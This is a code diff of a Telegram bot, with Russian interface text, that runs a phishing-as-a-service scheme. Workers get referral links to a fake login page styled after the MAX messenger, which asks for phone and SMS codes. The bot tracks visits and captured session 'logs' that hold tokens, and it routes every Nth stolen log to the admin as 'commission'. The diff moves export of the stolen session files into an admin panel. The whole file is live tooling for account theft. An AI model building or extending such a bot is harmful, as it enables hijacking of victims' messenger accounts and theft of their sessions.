@@ -1,15 +1,10 @@
 const fs = require('fs');
 const path = require('path');
-const { SESSION_NAME } = require('../server/bridge');
 const config = require('./config');
-const { filterOnlyNew, markExported } = require('./export-state');
-const { getUserSettings, setUserSettings, clearExportHistory } = require('./user-settings');
-
-const PERIOD_MS = {
-  day: 24 * 60 * 60 * 1000,
-  week: 7 * 24 * 60 * 60 * 1000,
-  month: 30 * 24 * 60 * 60 * 1000
-};
+const store = require('./store');
+const apiClient = require('./api-client');
+const { getUserSettings, setUserSettings } = require('./user-settings');
+const { createAdminPanel } = require('./admin-panel');
 
 const PERIOD_LABEL = {
   day: 'за день',
@@ -19,7 +14,6 @@ const PERIOD_LABEL = {
 };
 
 const TOKEN = config.token;
-const ADMINS = config.admins;
 const REQUIRED_CHATS = config.requiredChats;
 const SUBSCRIPTION_ENABLED = config.subscriptionEnabled;
 const ADMIN_ONLY = config.adminOnly;
@@ -37,166 +31,62 @@ const NAV = {
   TEMPLATES: 'templates',
   TEMPLATE_MAX: 'template_max',
   LINKS: 'links',
-  SETTINGS: 'settings'
+  SETTINGS: 'settings',
+  ADMIN: 'admin'
 };
-
-const ACTION = {
-  LIST: 'list',
-  DOWNLOAD: 'download',
-  EXPORT: 'export',
-  UPLOAD: 'upload',
-  STATS: 'stats'
-};
-
-const pendingUpload = new Set();
 
 let offset = 0;
 let running = true;
+let adminPanel;
 
 function ensureSessionsDir() {
   fs.mkdirSync(SESSIONS_DIR, { recursive: true });
 }
 
-function isAdmin(userId) {
-  return ADMINS.has(String(userId));
+async function isAdminUser(userId) {
+  return adminPanel.isAdmin(userId);
 }
 
 function configuredChats() {
   return REQUIRED_CHATS.filter((chat) => chat.chatId);
 }
 
-function sessionBasename(name) {
-  const base = path.basename(String(name || '').trim());
-  if (!base || base.includes('..') || !base.endsWith('.json')) {
-    throw new Error('Укажите имя файла, например: pult.json');
-  }
-  return base;
-}
-
-function listSessionFiles() {
-  ensureSessionsDir();
-  return fs
-    .readdirSync(SESSIONS_DIR)
-    .filter((name) => name.endsWith('.json'))
-    .map((name) => {
-      const full = path.join(SESSIONS_DIR, name);
-      const stat = fs.statSync(full);
-      let hasToken = false;
-      try {
-        const data = JSON.parse(fs.readFileSync(full, 'utf8'));
-        hasToken = Boolean(data && data.token);
-      } catch {
-        hasToken = false;
-      }
-      return {
-        name,
-        size: stat.size,
-        mtime: stat.mtime,
-        hasToken
-      };
-    })
-    .sort((a, b) => b.mtime.getTime() - a.mtime.getTime());
-}
-
-function formatBytes(size) {
-  if (size < 1024) return `${size} B`;
-  if (size < 1024 * 1024) return `${(size / 1024).toFixed(1)} KB`;
-  return `${(size / (1024 * 1024)).toFixed(1)} MB`;
-}
-
-function filterByPeriod(files, period) {
-  if (period === 'all') return files;
-  const ms = PERIOD_MS[period];
-  if (!ms) return files;
-  const since = Date.now() - ms;
-  return files.filter((file) => file.mtime.getTime() >= since);
-}
-
-function sessionStats(period) {
-  const files = filterByPeriod(listSessionFiles(), period);
-  const valid = files.filter((file) => file.hasToken);
-  return {
-    total: files.length,
-    valid: valid.length,
-    files
-  };
-}
-
-function formatStatsSummary() {
-  const day = sessionStats('day');
-  const week = sessionStats('week');
-  const month = sessionStats('month');
-  const all = sessionStats('all');
-
-  return [
-    '📊 Статистика логов',
-    '',
-    `Сегодня: ${day.valid} готовых / ${day.total} всего`,
-    `Неделя: ${week.valid} готовых / ${week.total} всего`,
-    `Месяц: ${month.valid} готовых / ${month.total} всего`,
-    `Всего: ${all.valid} готовых / ${all.total} всего`,
-    '',
-    'Готовые — сессии с токеном после успешного входа.'
-  ].join('\n');
-}
-
-function formatStatsPeriod(period) {
-  const stats = sessionStats(period);
-  const label = PERIOD_LABEL[period] || period;
-  if (!stats.files.length) {
-    return `За период ${label} логов пока нет.`;
-  }
-
-  const lines = stats.files.slice(0, 15).map((file) => {
-    const mark = file.hasToken ? '✅' : '⏳';
-    const date = file.mtime.toISOString().replace('T', ' ').slice(0, 16);
-    return `${mark} ${file.name} — ${formatBytes(file.size)}, ${date}`;
+async function trackUser(from) {
+  if (!from || !from.id) return null;
+  const user = store.touchUser(from.id, {
+    username: from.username || '',
+    firstName: from.first_name || ''
   });
-
-  const more = stats.files.length > 15 ? `\n…и ещё ${stats.files.length - 15}` : '';
-  return [
-    `📊 Логи ${label}`,
-    '',
-    `Готовых: ${stats.valid} · Всего: ${stats.total}`,
-    '',
-    ...lines,
-    more
-  ]
-    .filter(Boolean)
-    .join('\n');
+  await apiClient.syncUser(user);
+  return user;
 }
 
-function formatList(files) {
-  if (!files.length) {
-    return 'В папке sessions/ пока нет .json файлов.';
-  }
-  const lines = files.map((file) => {
-    const tokenMark = file.hasToken ? 'token: да' : 'token: нет';
-    const date = file.mtime.toISOString().replace('T', ' ').slice(0, 19);
-    return `• ${file.name} — ${formatBytes(file.size)}, ${tokenMark}, ${date}`;
-  });
-  return ['Файлы сессий:', '', ...lines].join('\n');
+function refLinkFor(user) {
+  const code = user && user.refCode ? user.refCode : '';
+  return `${AUTH_SITE}/?ref=${code}`;
 }
 
 function backButton() {
   return [{ text: '◀️ В меню', callback_data: `nav:${NAV.MENU}` }];
 }
 
-function mainMenuInlineKeyboard() {
-  return {
-    inline_keyboard: [
-      [{ text: '👨‍💻 Профиль', callback_data: `nav:${NAV.PROFILE}` }],
-      [
-        { text: '🔵 Боты', callback_data: `nav:${NAV.BOTS}` },
-        { text: '📄 Шаблоны', callback_data: `nav:${NAV.TEMPLATES}` }
-      ],
-      [
-        { text: '🔗 Ссылки', callback_data: `nav:${NAV.LINKS}` },
-        { text: '⚙️ Настройки', callback_data: `nav:${NAV.SETTINGS}` }
-      ],
-      [{ text: '» Поддержка', url: LINKS.support.url }]
-    ]
-  };
+async function mainMenuInlineKeyboard(userId) {
+  const rows = [
+    [{ text: '👨‍💻 Профиль', callback_data: `nav:${NAV.PROFILE}` }],
+    [
+      { text: '🔵 Боты', callback_data: `nav:${NAV.BOTS}` },
+      { text: '📄 Шаблоны', callback_data: `nav:${NAV.TEMPLATES}` }
+    ],
+    [
+      { text: '🔗 Ссылки', callback_data: `nav:${NAV.LINKS}` },
+      { text: '⚙️ Настройки', callback_data: `nav:${NAV.SETTINGS}` }
+    ],
+    [{ text: '» Поддержка', url: LINKS.support.url }]
+  ];
+  if (await isAdminUser(userId)) {
+    rows.splice(3, 0, [{ text: '🛡 Админ', callback_data: `nav:${NAV.ADMIN}` }]);
+  }
+  return { inline_keyboard: rows };
 }
 
 function profileKeyboard() {
@@ -207,14 +97,7 @@ function profileKeyboard() {
         { text: '📅 Неделя', callback_data: 'stats:week' },
         { text: '📅 Месяц', callback_data: 'stats:month' }
       ],
-      [
-        { text: '📋 Список', callback_data: `act:${ACTION.LIST}` },
-        { text: '📥 Скачать', callback_data: `act:${ACTION.DOWNLOAD}` }
-      ],
-      [
-        { text: '📤 Выгрузка', callback_data: `act:${ACTION.EXPORT}` },
-        { text: '📤 Загрузить', callback_data: `act:${ACTION.UPLOAD}` }
-      ],
+      [{ text: '🔗 Моя ссылка', callback_data: 'profile:link' }],
       backButton()
     ]
   };
@@ -250,7 +133,6 @@ function settingsKeyboard(userId) {
       [{ text: notifyLabel, callback_data: 'set:notify' }],
       [{ text: langLabel, callback_data: 'set:lang' }],
       [{ text: '🔗 Сайт авторизации', url: AUTH_SITE }],
-      [{ text: '🗑 Сбросить историю выгрузок', callback_data: 'set:reset_export' }],
       backButton()
     ]
   };
@@ -262,68 +144,48 @@ function subscribeKeyboard() {
   return { inline_keyboard: rows };
 }
 
-function downloadKeyboard(files) {
-  const rows = files.slice(0, 20).map((file, index) => [
-    { text: file.name, callback_data: `dl:${index}` }
-  ]);
-  rows.push(backButton());
-  return { inline_keyboard: rows };
+async function formatProfileSummary(userId) {
+  const day = await apiClient.userStats(userId, 'day');
+  const week = await apiClient.userStats(userId, 'week');
+  const month = await apiClient.userStats(userId, 'month');
+  const all = await apiClient.userStats(userId, 'all');
+  const every = all.commissionEvery;
+  const until = all.untilCommission;
+  const progressLine =
+    every > 0
+      ? `Комиссия: каждый ${every}-й лог → админу\nПрогресс цикла: ${all.progressInCycle}/${every}` +
+        (until != null ? `\nДо комиссионного: ${until}` : '')
+      : 'Комиссия выключена.';
+
+  return [
+    '👨‍💻 Профиль',
+    '',
+    `Сегодня: ${day.valid} готовых / ${day.logs} всего`,
+    `Неделя: ${week.valid} готовых / ${week.logs} всего`,
+    `Месяц: ${month.valid} готовых / ${month.logs} всего`,
+    `Всего: ${all.valid} готовых / ${all.logs} всего`,
+    `Визитов по ссылке: ${all.visits}`,
+    '',
+    progressLine,
+    '',
+    'Выгрузка логов доступна только в админ-панели.'
+  ].join('\n');
 }
 
-function exportKeyboard() {
-  return {
-    inline_keyboard: [
-      [
-        { text: '📅 День', callback_data: 'exp:day' },
-        { text: '📅 Неделя', callback_data: 'exp:week' }
-      ],
-      [
-        { text: '📅 Месяц', callback_data: 'exp:month' },
-        { text: '📦 Все', callback_data: 'exp:all' }
-      ],
-      [
-        { text: '✨ Новые · день', callback_data: 'exp:new:day' },
-        { text: '✨ Новые · неделя', callback_data: 'exp:new:week' }
-      ],
-      [
-        { text: '✨ Новые · месяц', callback_data: 'exp:new:month' },
-        { text: '✨ Все новые', callback_data: 'exp:new:all' }
-      ],
-      [{ text: '◀️ В профиль', callback_data: `nav:${NAV.PROFILE}` }]
-    ]
-  };
-}
-
-function collectExportFiles(userId, period, onlyNew) {
-  let files = filterByPeriod(listSessionFiles(), period);
-  if (onlyNew) files = filterOnlyNew(userId, files);
-  return files;
-}
-
-async function runExport(chatId, userId, period, onlyNew) {
-  const files = collectExportFiles(userId, period, onlyNew);
-
-  if (!files.length) {
-    const mode = onlyNew ? 'новых' : '';
-    await sendMessage(
-      chatId,
-      `Нет ${mode} сессий ${PERIOD_LABEL[period] || 'по фильтру'}.`,
-      { reply_markup: profileKeyboard() }
-    );
-    return;
-  }
-
-  for (const file of files) {
-    await sendDocument(chatId, path.join(SESSIONS_DIR, file.name), `sessions/${file.name}`);
-  }
-  markExported(userId, files);
-
-  const modeLabel = onlyNew ? 'только новые' : 'все';
-  await sendMessage(
-    chatId,
-    `Выгружено: ${files.length} файл(ов)\nРежим: ${modeLabel}, ${PERIOD_LABEL[period]}.`,
-    { reply_markup: profileKeyboard() }
-  );
+async function formatUserPeriod(userId, period) {
+  const stats = await apiClient.userStats(userId, period);
+  const label = PERIOD_LABEL[period] || period;
+  return [
+    `📊 Ваши логи ${label}`,
+    '',
+    `Готовых: ${stats.valid} · Всего: ${stats.logs}`,
+    `Визитов: ${stats.visits}`,
+    `Комиссионных забрано: ${stats.commissionTaken}`,
+    '',
+    stats.commissionEvery > 0
+      ? `Комиссия: каждый ${stats.commissionEvery}-й лог`
+      : 'Комиссия выключена'
+  ].join('\n');
 }
 
 function isMemberStatus(member) {
@@ -373,27 +235,16 @@ async function answerCallback(callbackQueryId, text = '') {
   });
 }
 
-async function sendDocument(chatId, filePath, caption = '') {
+async function sendDocumentBuffer(chatId, buffer, fileName, caption = '') {
   const form = new FormData();
   form.append('chat_id', String(chatId));
-  form.append('document', new Blob([fs.readFileSync(filePath)]), path.basename(filePath));
+  form.append('document', new Blob([buffer]), path.basename(fileName));
   if (caption) form.append('caption', caption);
   return api('sendDocument', form, { multipart: true });
 }
 
-async function downloadTelegramFile(fileId, targetPath) {
-  const file = await api('getFile', { file_id: fileId });
-  const url = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
-  const response = await fetch(url);
-  if (!response.ok) {
-    throw new Error('Не удалось скачать файл из Telegram.');
-  }
-  const buffer = Buffer.from(await response.arrayBuffer());
-  fs.writeFileSync(targetPath, buffer);
-}
-
 async function checkSubscription(userId) {
-  if (isAdmin(userId)) return { ok: true, missing: [] };
+  if (await isAdminUser(userId)) return { ok: true, missing: [] };
 
   const chats = configuredChats();
   if (!chats.length) {
@@ -445,8 +296,8 @@ async function removeReplyKeyboard(chatId) {
   await sendMessage(chatId, '·', { reply_markup: { remove_keyboard: true } });
 }
 
-async function showMainMenu(chatId, text = 'Главное меню:', options = {}) {
-  const markup = { reply_markup: mainMenuInlineKeyboard() };
+async function showMainMenu(chatId, userId, text = 'Главное меню:', options = {}) {
+  const markup = { reply_markup: await mainMenuInlineKeyboard(userId) };
   if (options.messageId) {
     await editMessage(chatId, options.messageId, text, markup);
     return;
@@ -454,20 +305,11 @@ async function showMainMenu(chatId, text = 'Главное меню:', options =
   await sendMessage(chatId, text, markup);
 }
 
-async function showProfile(chatId, messageId) {
-  const text = [
-    '👨‍💻 Профиль',
-    '',
-    formatStatsSummary(),
-    '',
-    'Здесь же — список, скачивание и выгрузка сессий.'
-  ].join('\n');
+async function showProfile(chatId, userId, messageId) {
+  const text = await formatProfileSummary(userId);
   const markup = { reply_markup: profileKeyboard() };
-  if (messageId) {
-    await editMessage(chatId, messageId, text, markup);
-  } else {
-    await sendMessage(chatId, text, markup);
-  }
+  if (messageId) await editMessage(chatId, messageId, text, markup);
+  else await sendMessage(chatId, text, markup);
 }
 
 async function showBots(chatId, messageId) {
@@ -479,56 +321,46 @@ async function showBots(chatId, messageId) {
     'Скоро здесь можно будет управлять своими ботами.'
   ].join('\n');
   const markup = { reply_markup: { inline_keyboard: [backButton()] } };
-  if (messageId) {
-    await editMessage(chatId, messageId, text, markup);
-  } else {
-    await sendMessage(chatId, text, markup);
-  }
+  if (messageId) await editMessage(chatId, messageId, text, markup);
+  else await sendMessage(chatId, text, markup);
 }
 
 async function showTemplates(chatId, messageId) {
   const text = ['📄 Шаблоны', '', 'Доступные шаблоны авторизации:'].join('\n');
   const markup = { reply_markup: templatesKeyboard() };
-  if (messageId) {
-    await editMessage(chatId, messageId, text, markup);
-  } else {
-    await sendMessage(chatId, text, markup);
-  }
+  if (messageId) await editMessage(chatId, messageId, text, markup);
+  else await sendMessage(chatId, text, markup);
 }
 
-async function showTemplateMax(chatId, messageId) {
+async function showTemplateMax(chatId, userId, messageId) {
+  const user = store.getUser(userId) || store.touchUser(userId);
+  const link = refLinkFor(user);
   const text = [
     '📄 Шаблон MAX',
     '',
-    'Страница входа в стиле оригинального MAX:',
-    'QR, телефон, SMS и выбор страны.',
+    'Страница входа в стиле MAX (телефон / SMS).',
     '',
-    `Сайт: ${AUTH_SITE}`,
+    `Ваша реф-ссылка:\n${link}`,
     '',
-    `После входа сессия сохраняется и доступна в профиле бота @${config.botUsername}.`
+    'Переходы и логи с этой ссылки считаются на ваш профиль.',
+    `После входа сессия сохраняется. Выгрузка — у админов (@${config.botUsername}).`
   ].join('\n');
   const markup = {
     inline_keyboard: [
-      [{ text: '🌐 Открыть сайт', url: AUTH_SITE }],
+      [{ text: '🌐 Открыть мою ссылку', url: link }],
       [{ text: '◀️ К шаблонам', callback_data: `nav:${NAV.TEMPLATES}` }],
       backButton()
     ]
   };
-  if (messageId) {
-    await editMessage(chatId, messageId, text, markup);
-  } else {
-    await sendMessage(chatId, text, markup);
-  }
+  if (messageId) await editMessage(chatId, messageId, text, { reply_markup: markup });
+  else await sendMessage(chatId, text, { reply_markup: markup });
 }
 
 async function showLinks(chatId, messageId) {
   const text = ['🔗 Ссылки', '', 'Наши ресурсы:'].join('\n');
   const markup = { reply_markup: linksKeyboard() };
-  if (messageId) {
-    await editMessage(chatId, messageId, text, markup);
-  } else {
-    await sendMessage(chatId, text, markup);
-  }
+  if (messageId) await editMessage(chatId, messageId, text, markup);
+  else await sendMessage(chatId, text, markup);
 }
 
 async function showSettings(chatId, userId, messageId) {
@@ -539,59 +371,26 @@ async function showSettings(chatId, userId, messageId) {
     `Уведомления: ${settings.notify ? 'включены' : 'выключены'}`,
     `Язык интерфейса: ${settings.lang === 'en' ? 'English' : 'Русский'}`,
     '',
-    'Сайт авторизации открывается по кнопке ниже.',
-    `Активная сессия пульта: ${SESSION_NAME}.json`
+    'Сайт авторизации — по кнопке ниже или через вашу реф-ссылку в профиле.'
   ].join('\n');
   const markup = { reply_markup: settingsKeyboard(userId) };
-  if (messageId) {
-    await editMessage(chatId, messageId, text, markup);
-  } else {
-    await sendMessage(chatId, text, markup);
-  }
+  if (messageId) await editMessage(chatId, messageId, text, markup);
+  else await sendMessage(chatId, text, markup);
 }
 
-async function requireAdmin(chatId, userId) {
-  if (!ADMIN_ONLY || isAdmin(userId)) return true;
+async function requireAdminGate(chatId, userId) {
+  if (!ADMIN_ONLY || (await isAdminUser(userId))) return true;
   await sendMessage(chatId, `Нет доступа.\nПоддержка: @${SUPPORT}`);
   return false;
 }
 
-async function sendSessionFile(chatId, name) {
-  const full = path.join(SESSIONS_DIR, sessionBasename(name));
-  if (!fs.existsSync(full)) {
-    throw new Error(`Файл sessions/${path.basename(name)} не найден.`);
-  }
-  await sendDocument(chatId, full, `sessions/${path.basename(name)}`);
-}
-
-async function handleDocument(chatId, document) {
-  const name = sessionBasename(document.file_name || '');
-  const target = path.join(SESSIONS_DIR, name);
-  await downloadTelegramFile(document.file_id, target);
-
-  try {
-    const data = JSON.parse(fs.readFileSync(target, 'utf8'));
-    if (!data || typeof data !== 'object') {
-      throw new Error('JSON должен быть объектом.');
-    }
-  } catch (error) {
-    fs.unlinkSync(target);
-    throw new Error(`Файл не похож на сессию: ${error.message}`);
-  }
-
-  pendingUpload.delete(chatId);
-  await sendMessage(chatId, `Сохранено: sessions/${name}`, {
-    reply_markup: profileKeyboard()
-  });
-}
-
 async function handleNavigation(chatId, userId, nav, messageId) {
   if (nav === NAV.MENU) {
-    await showMainMenu(chatId, 'Главное меню:', { messageId });
+    await showMainMenu(chatId, userId, 'Главное меню:', { messageId });
     return;
   }
   if (nav === NAV.PROFILE) {
-    await showProfile(chatId, messageId);
+    await showProfile(chatId, userId, messageId);
     return;
   }
   if (nav === NAV.BOTS) {
@@ -603,7 +402,7 @@ async function handleNavigation(chatId, userId, nav, messageId) {
     return;
   }
   if (nav === NAV.TEMPLATE_MAX) {
-    await showTemplateMax(chatId, messageId);
+    await showTemplateMax(chatId, userId, messageId);
     return;
   }
   if (nav === NAV.LINKS) {
@@ -614,103 +413,52 @@ async function handleNavigation(chatId, userId, nav, messageId) {
     await showSettings(chatId, userId, messageId);
     return;
   }
-}
-
-async function handleAction(chatId, action, messageId) {
-  if (action === ACTION.LIST) {
-    const text = formatList(listSessionFiles());
-    const markup = { reply_markup: profileKeyboard() };
-    if (messageId) {
-      await editMessage(chatId, messageId, text, markup);
-    } else {
-      await sendMessage(chatId, text, markup);
-    }
-    return;
-  }
-
-  if (action === ACTION.DOWNLOAD) {
-    const files = listSessionFiles();
-    if (!files.length) {
-      const text = 'Нет файлов для скачивания.';
-      const markup = { reply_markup: profileKeyboard() };
-      if (messageId) {
-        await editMessage(chatId, messageId, text, markup);
-      } else {
-        await sendMessage(chatId, text, markup);
-      }
+  if (nav === NAV.ADMIN) {
+    if (!(await isAdminUser(userId))) {
+      await sendMessage(chatId, 'Нет доступа к админке.');
       return;
     }
-    const text = 'Выберите файл:';
-    const markup = { reply_markup: downloadKeyboard(files) };
-    if (messageId) {
-      await editMessage(chatId, messageId, text, markup);
-    } else {
-      await sendMessage(chatId, text, markup);
-    }
-    return;
-  }
-
-  if (action === ACTION.EXPORT) {
-    const text = [
-      'Выгрузка сессий:',
-      '',
-      'Период — файлы по дате изменения.',
-      '«Только новые» — те, что ещё не выгружали.'
-    ].join('\n');
-    const markup = { reply_markup: exportKeyboard() };
-    if (messageId) {
-      await editMessage(chatId, messageId, text, markup);
-    } else {
-      await sendMessage(chatId, text, markup);
-    }
-    return;
-  }
-
-  if (action === ACTION.UPLOAD) {
-    pendingUpload.add(chatId);
-    const text = 'Пришлите .json файл сессии документом.';
-    const markup = { reply_markup: profileKeyboard() };
-    if (messageId) {
-      await editMessage(chatId, messageId, text, markup);
-    } else {
-      await sendMessage(chatId, text, markup);
-    }
+    await adminPanel.showHome(chatId, messageId);
   }
 }
 
-async function handleText(chatId, userId, text) {
+async function handleText(chatId, userId, text, from) {
+  await trackUser(from);
   const trimmed = String(text || '').trim();
+
+  if (await adminPanel.handleText(chatId, userId, trimmed)) return;
 
   if (trimmed === '/start') {
     if (!(await requireSubscription(chatId, userId))) return;
-    if (!(await requireAdmin(chatId, userId))) return;
+    if (!(await requireAdminGate(chatId, userId))) return;
     await removeReplyKeyboard(chatId);
-    await showMainMenu(chatId, `Привет! @${config.botUsername}\n\nГлавное меню:`);
+    const user = store.getUser(userId) || store.touchUser(userId);
+    await showMainMenu(
+      chatId,
+      userId,
+      `Привет! @${config.botUsername}\n\nВаша ссылка:\n${refLinkFor(user)}\n\nГлавное меню:`
+    );
     return;
   }
 
   if (trimmed === '/help' || trimmed === '/menu') {
     if (!(await requireSubscription(chatId, userId))) return;
-    if (!(await requireAdmin(chatId, userId))) return;
-    await showMainMenu(chatId);
+    if (!(await requireAdminGate(chatId, userId))) return;
+    await showMainMenu(chatId, userId);
     return;
   }
 
-  if (trimmed === '/chatid' && isAdmin(userId) && String(chatId).startsWith('-')) {
+  if (trimmed === '/chatid' && (await isAdminUser(userId)) && String(chatId).startsWith('-')) {
     await sendMessage(chatId, `chat_id этого чата: ${chatId}`);
     return;
   }
 
-  if (trimmed.startsWith('/get')) {
-    if (!(await requireSubscription(chatId, userId))) return;
-    if (!(await requireAdmin(chatId, userId))) return;
-    const name = trimmed.split(/\s+/)[1] || `${SESSION_NAME}.json`;
-    await sendSessionFile(chatId, name);
-    return;
-  }
-
-  if (pendingUpload.has(chatId)) {
-    await sendMessage(chatId, 'Жду .json документ, не текст.');
+  if (trimmed === '/admin') {
+    if (!(await isAdminUser(userId))) {
+      await sendMessage(chatId, 'Нет доступа.');
+      return;
+    }
+    await adminPanel.showHome(chatId);
   }
 }
 
@@ -720,6 +468,8 @@ async function handleCallback(callback) {
   const data = callback.data || '';
 
   try {
+    await trackUser(callback.from);
+
     if (data === 'check_sub' && SUBSCRIPTION_ENABLED) {
       const result = await checkSubscription(userId);
       if (!result.ok) {
@@ -738,16 +488,21 @@ async function handleCallback(callback) {
       }
 
       await answerCallback(callback.id, 'Подписка подтверждена');
-      if (!(await requireAdmin(chatId, userId))) return;
-      await showMainMenu(chatId, 'Подписка подтверждена. Главное меню:', {
+      if (!(await requireAdminGate(chatId, userId))) return;
+      await showMainMenu(chatId, userId, 'Подписка подтверждена. Главное меню:', {
         messageId: callback.message.message_id
       });
       return;
     }
 
+    if (data.startsWith('admin:')) {
+      const handled = await adminPanel.handleCallback(callback);
+      if (handled) return;
+    }
+
     if (data.startsWith('nav:')) {
       if (!(await requireSubscription(chatId, userId))) return;
-      if (!(await requireAdmin(chatId, userId))) return;
+      if (!(await requireAdminGate(chatId, userId))) return;
       await answerCallback(callback.id);
       await handleNavigation(chatId, userId, data.slice(4), callback.message.message_id);
       return;
@@ -755,23 +510,30 @@ async function handleCallback(callback) {
 
     if (data.startsWith('stats:')) {
       if (!(await requireSubscription(chatId, userId))) return;
-      if (!(await requireAdmin(chatId, userId))) return;
+      if (!(await requireAdminGate(chatId, userId))) return;
       const period = data.slice(6);
       if (!PERIOD_LABEL[period]) {
         await answerCallback(callback.id, 'Неизвестный период');
         return;
       }
       await answerCallback(callback.id);
-      const text = formatStatsPeriod(period);
+      const text = await formatUserPeriod(userId, period);
       await editMessage(chatId, callback.message.message_id, text, {
         reply_markup: profileKeyboard()
       });
       return;
     }
 
+    if (data === 'profile:link') {
+      await answerCallback(callback.id);
+      const user = store.getUser(userId) || store.touchUser(userId);
+      await sendMessage(chatId, `Ваша реф-ссылка:\n${refLinkFor(user)}`);
+      return;
+    }
+
     if (data.startsWith('set:')) {
       if (!(await requireSubscription(chatId, userId))) return;
-      if (!(await requireAdmin(chatId, userId))) return;
+      if (!(await requireAdminGate(chatId, userId))) return;
       const setting = data.slice(4);
       if (setting === 'notify') {
         const current = getUserSettings(userId);
@@ -787,51 +549,7 @@ async function handleCallback(callback) {
         await showSettings(chatId, userId, callback.message.message_id);
         return;
       }
-      if (setting === 'reset_export') {
-        clearExportHistory(userId);
-        await answerCallback(callback.id, 'История выгрузок сброшена');
-        await showSettings(chatId, userId, callback.message.message_id);
-        return;
-      }
       await answerCallback(callback.id);
-      return;
-    }
-
-    if (data.startsWith('act:')) {
-      if (!(await requireSubscription(chatId, userId))) return;
-      if (!(await requireAdmin(chatId, userId))) return;
-      await answerCallback(callback.id);
-      await handleAction(chatId, data.slice(4), callback.message.message_id);
-      return;
-    }
-
-    if (data.startsWith('exp:')) {
-      if (!(await requireSubscription(chatId, userId))) return;
-      if (!(await requireAdmin(chatId, userId))) return;
-      const parts = data.split(':');
-      const onlyNew = parts[1] === 'new';
-      const period = onlyNew ? parts[2] : parts[1];
-      if (!PERIOD_LABEL[period]) {
-        await answerCallback(callback.id, 'Неизвестный период');
-        return;
-      }
-      await answerCallback(callback.id, 'Выгружаю...');
-      await runExport(chatId, userId, period, onlyNew);
-      return;
-    }
-
-    if (data.startsWith('dl:')) {
-      if (!(await requireSubscription(chatId, userId))) return;
-      if (!(await requireAdmin(chatId, userId))) return;
-      const index = Number(data.slice(3));
-      const files = listSessionFiles();
-      const file = files[index];
-      if (!file) {
-        await answerCallback(callback.id, 'Файл не найден');
-        return;
-      }
-      await answerCallback(callback.id);
-      await sendSessionFile(chatId, file.name);
       return;
     }
 
@@ -854,14 +572,8 @@ async function handleUpdate(update) {
   const userId = message.from.id;
 
   try {
-    if (message.document) {
-      if (!(await requireSubscription(chatId, userId))) return;
-      if (!(await requireAdmin(chatId, userId))) return;
-      await handleDocument(chatId, message.document);
-      return;
-    }
     if (message.text) {
-      await handleText(chatId, userId, message.text);
+      await handleText(chatId, userId, message.text, message.from);
     }
   } catch (error) {
     await sendMessage(chatId, `Ошибка: ${error.message || String(error)}`);
@@ -893,8 +605,8 @@ function validateEnv() {
     console.error('Нужен TELEGRAM_BOT_TOKEN в .env');
     process.exit(1);
   }
-  if (!ADMINS.size) {
-    console.error('Нужен TELEGRAM_ADMIN_IDS в .env');
+  if (!config.admins.size && !config.ownerId) {
+    console.error('Нужен TELEGRAM_ADMIN_IDS или TELEGRAM_OWNER_ID в .env');
     process.exit(1);
   }
   if (SUBSCRIPTION_ENABLED && !configuredChats().length) {
@@ -941,13 +653,22 @@ async function bootstrap() {
   validateEnv();
   acquireLock();
   ensureSessionsDir();
+
+  adminPanel = createAdminPanel({
+    sendMessage,
+    editMessage,
+    answerCallback,
+    sendDocumentBuffer,
+    api
+  });
+
   try {
     await api('deleteWebhook', { drop_pending_updates: true });
   } catch (error) {
     console.warn('deleteWebhook:', error.message || error);
   }
   console.log(
-    `@${config.botUsername}: admins=${ADMINS.size}, subscription=${SUBSCRIPTION_ENABLED ? 'on' : 'off'}, adminOnly=${ADMIN_ONLY ? 'on' : 'off'}`
+    `@${config.botUsername}: owner=${config.ownerId}, envAdmins=${config.admins.size}, subscription=${SUBSCRIPTION_ENABLED ? 'on' : 'off'}, adminOnly=${ADMIN_ONLY ? 'on' : 'off'}, remoteApi=${apiClient.useRemote() ? 'yes' : 'no'}`
   );
   await poll();
 }
